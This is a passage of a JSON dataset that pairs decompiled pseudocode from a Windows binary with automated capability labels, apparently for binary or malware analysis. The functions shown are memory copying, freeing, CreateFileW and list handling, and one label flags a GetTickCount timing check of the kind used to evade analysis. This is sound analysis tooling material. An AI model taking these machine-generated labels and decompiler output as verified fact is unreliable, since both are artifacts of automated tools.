+ 1;\n            }\n            switch(*((uVar16 & 3) * 4 + 0x40e8d0)) {\n            case 0x40e8e8:\n                goto code_r0x0040e8e8;\n            case 0x40e8f4:\n                goto code_r0x0040e8f4;\n            case 0x40e908:\n                goto code_r0x0040e908;\n            }\n            break;\n        case 0x40e820:\n            *arg_8h = *arg_ch;\n            uVar17 = uVar16 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar18 = arg_8h + 2;\n            if (uVar17 < 8) goto code_r0x0040e7e0;\n            for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            switch(*((uVar16 & 3) * 4 + 0x40e8d0)) {\n            case 0x40e8e8:\n                goto code_r0x0040e8e8;\n            case 0x40e8f4:\n                goto code_r0x0040e8f4;\n            case 0x40e908:\n                goto code_r0x0040e908;\n            }\n            break;\n        case 0x40e844:\n            *arg_8h = *arg_ch;\n            uVar17 = uVar16 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar18 = arg_8h + 1;\n            if (uVar17 < 8) goto code_r0x0040e7e0;\n            for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            switch(*((uVar16 & 3) * 4 + 0x40e8d0)) {\n            case 0x40e8e8:\n                goto code_r0x0040e8e8;\n            case 0x40e8f4:\n                goto code_r0x0040e8f4;\n            case 0x40e908:\n                goto code_r0x0040e908;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 4277
    },
    "0040aa14": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aa14(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.00404818(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0040fecc": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040fecc(void)\n\n{\n    *0x4e8340 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x40334c, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 65
    },
    "004094a3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004094a3(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004055b0(0x4e56e8, 0xc);\n    fcn.004098d4(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4efafc;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4efaf8;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004094e7;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00404818(arg_8h_00);\ncode_r0x004094e7:\n        fcn.00404818(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040950a();\n    fcn.004055f5();\n    return;\n}\n",
        "token_count": 398
    }
}